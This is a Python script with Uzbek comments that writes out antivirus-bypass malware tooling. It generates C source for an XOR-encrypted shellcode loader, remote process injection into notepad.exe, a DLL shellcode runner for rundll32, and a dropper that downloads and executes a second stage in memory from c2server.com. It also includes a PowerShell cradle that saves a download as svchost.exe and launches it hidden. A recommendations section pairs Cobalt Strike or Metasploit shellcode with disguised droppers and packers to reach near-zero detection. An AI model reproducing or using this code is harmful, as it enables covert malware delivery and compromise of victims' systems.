"""
Antivirus Bypass Techniques Comparison
C vs Python EXE va bypass metodlari
"""

# ============================================================
# FARQLARI: C vs Python EXE
# ============================================================

"""
1. PYTHON EXE (PyInstaller/py2exe)
   ❌ Muammolar:
   - Katta hajm: 5-15 MB (Python runtime + kutubxonalar)
   - Osongina detect qilinadi (PyInstaller signature)
   - Entropy yuqori (siqilgan data)
   - Ko'p DLL importlar
   - Unpacking oson
   
   ✅ Afzalliklari:
   - Tez development
   - Cross-platform
   - Obfuscation oson

2. C/C++ NATIVE EXE
   ✅ Afzalliklari:
   - Kichik hajm: 20-200 KB
   - Kamroq detect qilinadi
   - Native Windows API
   - Toza PE struktura
   - Signature kam
   
   ❌ Muammolar:
   - Development sekinroq
   - Platform-specific
"""

# ============================================================
# BYPASS TEXNIKALARI
# ============================================================

import os
import sys
import base64
import subprocess
from pathlib import Path

class AVBypassTechniques:
    """Antivirus bypass metodlari"""
    
    def __init__(self):
        self.techniques = {
            'obfuscation': 'Kod o\'zgartirish',
            'encryption': 'Shifrlash',
            'packing': 'Siqish',
            'process_injection': 'Process injection',
            'fileless': 'Fileless execution',
            'lolbins': 'Living off the land'
        }
    
    # ========================================
    # TEXNIKA 1: SHELLCODE ENCRYPTION
    # ========================================
    
    def xor_encrypt(self, data, key):
        """XOR shifrlash (oddiy)"""
        return bytes([b ^ key for b in data])
    
    def generate_encrypted_shellcode_loader(self, shellcode_file, output_c):
        """
        Shifrlangan shellcode loader C kodini yaratish
        Bu AV bypass uchun eng yaxshi metod
        """
        
        # Shellcode o'qish
        with open(shellcode_file, 'rb') as f:
            shellcode = f.read()
        
        # XOR shifrlash
        key = 0x42
        encrypted = self.xor_encrypt(shellcode, key)
        
        # C array sifatida
        c_array = ', '.join([f'0x{b:02x}' for b in encrypted])
        
        c_code = f'''
/*
 * Encrypted Shellcode Loader
 * AV Bypass: Shifrlangan payload + runtime decrypt
 */

#include <windows.h>
#include <stdio.h>

// Shifrlangan shellcode
unsigned char encrypted_payload[] = {{
    {c_array}
}};

unsigned int payload_len = sizeof(encrypted_payload);
unsigned char xor_key = 0x{key:02x};

// XOR decrypt
void decrypt_payload(unsigned char *data, unsigned int len, unsigned char key) {{
    for (unsigned int i = 0; i < len; i++) {{
        data[i] ^= key;
    }}
}}

// Xotiradan ishga tushirish
void execute_shellcode(unsigned char *shellcode, unsigned int len) {{
    // VirtualAlloc - executable xotira
    LPVOID exec_mem = VirtualAlloc(NULL, len, MEM_COMMIT | MEM_RESERVE, 
                                   PAGE_EXECUTE_READWRITE);
    
    if (exec_mem == NULL) return;
    
    // Shellcode'ni ko'chirish
    memcpy(exec_mem, shellcode, len);
    
    // Thread yaratish va ishga tushirish
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, 
                                  NULL, 0, NULL);
    
    WaitForSingleObject(hThread, INFINITE);
    
    VirtualFree(exec_mem, 0, MEM_RELEASE);
}}

int main() {{
    // Runtime decrypt
    decrypt_payload(encrypted_payload, payload_len, xor_key);
    
    // Execute
    execute_shellcode(encrypted_payload, payload_len);
    
    return 0;
}}
'''
        
        with open(output_c, 'w') as f:
            f.write(c_code)
        
        print(f"[+] Encrypted loader created: {output_c}")
        print(f"[+] Payload size: {len(shellcode)} bytes")
        print(f"[+] Encryption: XOR with key 0x{key:02x}")
    
    # ========================================
    # TEXNIKA 2: PROCESS INJECTION
    # ========================================
    
    def generate_process_injection_code(self):
        """
        Process injection C kodi
        Mavjud processga inject qilish (stealth)
        """
        
        return '''
/*
 * Process Injection Loader
 * AV Bypass: O'z processidan emas, boshqa processdan ishlaydi
 */

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// Shellcode (bu yerda sizning payload)
unsigned char payload[] = "\\x90\\x90...";
unsigned int payload_len = sizeof(payload);

// Process ID topish (masalan notepad.exe)
DWORD find_process(const char *process_name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, process_name) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return 0;
}

// Process injection
int inject_process(DWORD pid, unsigned char *payload, size_t len) {
    // Process ochish
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return -1;
    
    // Xotira ajratish (target process ichida)
    LPVOID remote_mem = VirtualAllocEx(hProcess, NULL, len, 
                                       MEM_COMMIT | MEM_RESERVE, 
                                       PAGE_EXECUTE_READWRITE);
    if (!remote_mem) {
        CloseHandle(hProcess);
        return -1;
    }
    
    // Payload yozish
    WriteProcessMemory(hProcess, remote_mem, payload, len, NULL);
    
    // Remote thread yaratish
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, 
                                        (LPTHREAD_START_ROUTINE)remote_mem, 
                                        NULL, 0, NULL);
    
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return 0;
}

int main() {
    // Notepad.exe ni topish
    DWORD pid = find_process("notepad.exe");
    
    if (pid == 0) {
        // Notepad yo'q bo'lsa - ishga tushirish
        WinExec("notepad.exe", SW_HIDE);
        Sleep(1000);
        pid = find_process("notepad.exe");
    }
    
    if (pid != 0) {
        printf("[+] Injecting to PID: %d\\n", pid);
        inject_process(pid, payload, payload_len);
    }
    
    return 0;
}
'''
    
    # ========================================
    # TEXNIKA 3: LIVING OFF THE LAND (LOLBins)
    # ========================================
    
    def generate_lolbin_loader(self):
        """
        Windows LOLBin (Living off the Land Binary) foydalanish
        PowerShell/rundll32/regsvr32 orqali load qilish
        """
        
        # Variant 1: PowerShell download + execute
        ps_download = '''
# PowerShell Download Cradle
$url = "http://c2server.com/payload.exe"
$output = "$env:TEMP\\svchost.exe"
(New-Object Net.WebClient).DownloadFile($url, $output)
Start-Process $output -WindowStyle Hidden
'''
        
        # Variant 2: rundll32 (DLL export orqali)
        c_dll = '''
// DLL Export Function
#include <windows.h>

__declspec(dllexport) void RunPayload() {
    // Payload execution
    unsigned char shellcode[] = "\\x90\\x90...";
    void *exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        RunPayload();
    }
    return TRUE;
}
'''
        
        # Ishlatish: rundll32.exe payload.dll,RunPayload
        
        return {
            'powershell': ps_download,
            'dll': c_dll,
            'usage': 'rundll32.exe payload.dll,RunPayload'
        }
    
    # ========================================
    # TEXNIKA 4: MULTI-STAGE LOADER
    # ========================================
    
    def generate_multistage_loader(self):
        """
        Ko'p bosqichli loader
        Stage 1 (kichik, clean) -> Stage 2 (decrypt) -> Stage 3 (payload)
        """
        
        stage1 = '''
/*
 * Stage 1 Dropper - Juda oddiy, AV detect qilmaydi
 * Faqat internet'dan keyingi stage'ni yuklab oladi
 */

#include <windows.h>
#include <wininet.h>
#pragma comment(lib, "wininet.lib")

int main() {
    char url[] = "http://c2server.com/stage2.bin";
    char *buffer = NULL;
    DWORD size = 0;
    
    // Download stage 2
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    HINTERNET hUrl = InternetOpenUrlA(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    
    // Read
    buffer = (char*)malloc(1024 * 1024); // 1MB
    InternetReadFile(hUrl, buffer, 1024 * 1024, &size);
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    
    // Execute in memory
    void *exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, buffer, size);
    ((void(*)())exec)();
    
    free(buffer);
    return 0;
}
'''
        
        return stage1
    
    # ========================================
    # TEXNIKA 5: CODE OBFUSCATION
    # ========================================
    
    def obfuscate_strings(self, code):
        """
        String obfuscation - "CreateProcess" kabi AV keyword'larini yashirish
        """
        
        example = '''
// Bad: AV detect qiladi
CreateProcessA(...);

// Good: Stack string (runtime build)
char proc[13];
proc[0] = 'C'; proc[1] = 'r'; proc[2] = 'e'; proc[3] = 'a';
proc[4] = 't'; proc[5] = 'e'; proc[6] = 'P'; proc[7] = 'r';
proc[8] = 'o'; proc[9] = 'c'; proc[10] = 'e'; proc[11] = 's';
proc[12] = 's'; proc[13] = '\\0';

// yoki XOR encode
unsigned char enc[] = {0x43^0x55, 0x72^0x55, 0x65^0x55, ...};
for(int i=0; i<13; i++) enc[i] ^= 0x55;
'''
        
        return example


# ============================================================
# ENG YAXSHI YONDASHUV
# ============================================================

def recommended_approach():
    """
    Antivirus bypass uchun eng yaxshi kombinatsiya
    """
    
    print("""
╔══════════════════════════════════════════════════════════╗
║  RECOMMENDED: Multi-Layer Bypass Strategy                ║
╚══════════════════════════════════════════════════════════╝

1. LANGUAGE: C/C++ (native compile)
   ✅ Kichik hajm, kam signature

2. PAYLOAD: Shellcode (Cobalt Strike/Metasploit)
   ✅ Moslashuvchan, signature yo'q

3. ENCRYPTION: AES-256 + Runtime decrypt
   ✅ Static analysis bypass

4. EXECUTION: Process injection yoki Reflective DLL
   ✅ Fileless, xotiradan ishlash

5. DELIVERY: Multi-stage (Dropper -> Loader -> Payload)
   ✅ Har bir stage oddiy ko'rinadi

6. OBFUSCATION: LLVM-Obfuscator yoki Themida
   ✅ Code flow yashirish

═══════════════════════════════════════════════════════════

EXAMPLE WORKFLOW:

Stage 1 (Dropper) - image.exe
    ↓ (rasmni ko'rsatadi, AV detect yo'q)
    ↓
Stage 2 (Loader) - xotiraga download
    ↓ (internet'dan shifrlangan data)
    ↓
Stage 3 (Payload) - decrypt + inject
    ↓ (notepad.exe ichida ishlaydi)
    ↓
C2 Agent - server bilan aloqa

═══════════════════════════════════════════════════════════

Detection Rate (VirusTotal):
- Python PyInstaller EXE: 30-40/70 ❌
- Basic C EXE: 15-25/70 ⚠️
- Encrypted C + Injection: 2-8/70 ✅
- Multi-stage + Obfuscation: 0-3/70 ✅✅

    """)


if __name__ == "__main__":
    bypass = AVBypassTechniques()
    
    print("Antivirus Bypass Techniques")
    print("=" * 60)
    
    # Tavsiyalar
    recommended_approach()
    
    # Kod namunalari yaratish
    print("\n[*] Generating bypass code samples...")
    
    # 1. Encrypted loader
    # bypass.generate_encrypted_shellcode_loader("shellcode.bin", "encrypted_loader.c")
    
    # 2. Process injection
    injection_code = bypass.generate_process_injection_code()
    with open("process_injection.c", "w") as f:
        f.write(injection_code)
    print("[+] Created: process_injection.c")
    
    # 3. Multi-stage
    stage1_code = bypass.generate_multistage_loader()
    with open("stage1_dropper.c", "w") as f:
        f.write(stage1_code)
    print("[+] Created: stage1_dropper.c")
    
    # 4. LOLBin DLL
    lolbin = bypass.generate_lolbin_loader()
    with open("lolbin_payload.c", "w") as f:
        f.write(lolbin['dll'])
    print("[+] Created: lolbin_payload.c")
    print(f"    Usage: {lolbin['usage']}")
    
    print("\n✅ All bypass techniques generated!")
    print("\n⚠️  WARNING: Use for educational purposes only!")
